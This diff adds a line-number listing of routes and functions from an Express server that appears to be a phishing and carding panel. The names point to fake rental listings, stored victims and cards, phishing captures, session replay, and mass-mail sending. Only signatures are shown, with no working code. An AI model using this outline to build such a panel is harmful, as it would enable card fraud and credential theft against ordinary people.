@@ -1,0 +1,70 @@
+﻿
+LineNumber Line                                                                                                        
+---------- ----                                                                                                        
+       679 function apartmentToListingFields(apt) {                                                                    
+      1313 function buildListingInjectPayload(listing, req) {                                                          
+      1430   const p = buildListingInjectPayload(listing, req);                                                        
+      1982   const p = buildListingInjectPayload(listing, req);                                                        
+      3903 app.get('/dashboard', requireClient, (req, res) => {                                                        
+      3984 app.get('/dashboard/create', requireClient, (req, res) => {                                                 
+      3999 app.get('/dashboard/listari', requireClient, (req, res) => {                                                
+      4041 app.get('/dashboard/listings', requireClient, (req, res) => {                                               
+      4048 app.get('/dashboard/airbnb', requireClient, (req, res) => {                                                 
+      4056 app.get('/dashboard/booking', requireClient, (req, res) => {                                                
+      4065 app.post('/dashboard/listings/create', requireClient, (req, res, next) => {                                 
+      4081 app.get('/dashboard/listings/edit/:id', requireClient, (req, res) => {                                      
+      4092 app.post('/dashboard/listings/update/:id', requireClient, (req, res, next) => {                             
+      4110 function handleCreateListing(req, res) {                                                                    
+      4295 function handleUpdateListing(req, res) {                                                                    
+      4536 app.get('/dashboard/listings/delete/:id', requireClient, (req, res) => {                                    
+      4548 app.post('/dashboard/listings/delete-bulk', requireClient, (req, res) => {                                  
+      4570 app.post('/dashboard/listings/status/:id', requireClient, (req, res) => {                                   
+      4588 app.get('/dashboard/apartments', requireClient, (req, res) => {                                             
+      4625 app.get('/dashboard/apartments/edit/:id', requireClient, (req, res) => {                                    
+      4633 app.get('/dashboard/apartments/delete/:id', requireClient, (req, res) => {                                  
+      4639 app.post('/dashboard/apartments/save', requireClient, (req, res, next) => {                                 
+      4827 app.get('/dashboard/users', requireClient, (req, res) => {                                                  
+      4881 app.get('/dashboard/victims', requireClient, (req, res) => res.redirect('/dashboard/users'));               
+      4883 app.get('/dashboard/users/delete/:id', requireClient, (req, res) => {                                       
+      4895 app.post('/dashboard/users/delete-bulk', requireClient, (req, res) => {                                     
+      4912 app.get('/dashboard/users/edit/:id', requireClient, (req, res) => {                                         
+      4932 app.post('/dashboard/users/edit/:id', requireClient, (req, res) => {                                        
+      4949 app.get('/dashboard/cards', requireClient, (req, res) => {                                                  
+      4987 app.get('/dashboard/cards/delete/:id', requireClient, (req, res) => {                                       
+      4993 app.post('/dashboard/cards/delete-bulk', requireClient, (req, res) => {                                     
+      5005 app.get('/dashboard/cards/edit/:id', requireClient, (req, res) => {                                         
+      5025 app.post('/dashboard/cards/edit/:id', requireClient, (req, res) => {                                        
+      5042 app.get('/dashboard/payments', requireClient, (req, res) => {                                               
+      5050 app.get('/dashboard/settings', requireClient, (req, res) => {                                               
+      5072 app.post('/dashboard/settings', requireClient, (req, res) => {                                              
+      5097 app.get('/dashboard/payment-config', requireClient, (req, res) => {                                         
+      5144 app.post('/dashboard/payment-config', requireClient, (req, res) => {                                        
+      5170 app.get('/dashboard/hosts', requireClient, (req, res) => {                                                  
+      5222 app.get('/dashboard/hosts/edit/:id', requireClient, (req, res) => {                                         
+      5230 app.get('/dashboard/hosts/delete/:id', requireClient, (req, res) => {                                       
+      5236 app.post('/dashboard/hosts/delete-bulk', requireClient, (req, res) => {                                     
+      5248 app.post('/dashboard/hosts/save', requireClient, (req, res, next) => {                                      
+      6264 app.get('/listing/:id', (req, res) => {                                                                     
+      7920 app.get('/dashboard/cloudmail', requireClient, (req, res) => {                                              
+      8057 app.get('/dashboard/cloudmail/accounts', requireClient, (req, res) => {                                     
+      8105 app.post('/dashboard/cloudmail/accounts/create', requireClient, (req, res) => {                             
+      8128 app.get('/dashboard/cloudmail/accounts/delete/:id', requireClient, (req, res) => {                          
+      8138 app.post('/dashboard/cloudmail/campaign/create', requireClient, (req, res) => {                             
+      8147 app.get('/dashboard/cloudmail/campaign/delete/:id', requireClient, (req, res) => {                          
+      8153 app.get('/dashboard/cloudmail/replay/:id', requireClient, (req, res) => {                                   
+      8172 app.get('/dashboard/cloudmail/revoke/:id', requireClient, (req, res) => {                                   
+      8189 app.get('/dashboard/cloudmail/victim/delete/:id', requireClient, (req, res) => {                            
+      8862 app.get('/dashboard/phishlab', requireClient, (req, res) => { res.send(phDashOverview(req, req.query.crea...
+      8864 app.post('/dashboard/phishlab/campaign/create', requireClient, (req, res) => {                              
+      8873 app.get('/dashboard/phishlab/campaign/delete/:id', requireClient, (req, res) => {                           
+      8881 app.get('/dashboard/phishlab/captures', requireClient, (req, res) => { res.send(phDashCaptures(req, req.q...
+      8883 app.get('/dashboard/phishlab/captures/delete/:id', requireClient, (req, res) => {                           
+      8891 app.get('/dashboard/phishlab/captures/export/:id', requireClient, (req, res) => {                           
+      8898 app.get('/dashboard/phishlab/replay/:id', requireClient, (req, res) => {                                    
+      8909 app.get('/dashboard/phishlab/revoke/:id', requireClient, (req, res) => {                                    
+      9033 app.get('/dashboard/phishlab/mail', requireClient, (req, res) => {                                          
+      9046 app.post('/dashboard/phishlab/mail/send', requireClient, (req, res) => {                                    
+      9078 app.post('/dashboard/phishlab/mail/smtp', requireClient, (req, res) => {                                    
+      9095 app.post('/dashboard/phishlab/mail/smtp/test', requireClient, (req, res) => {                               
+
+
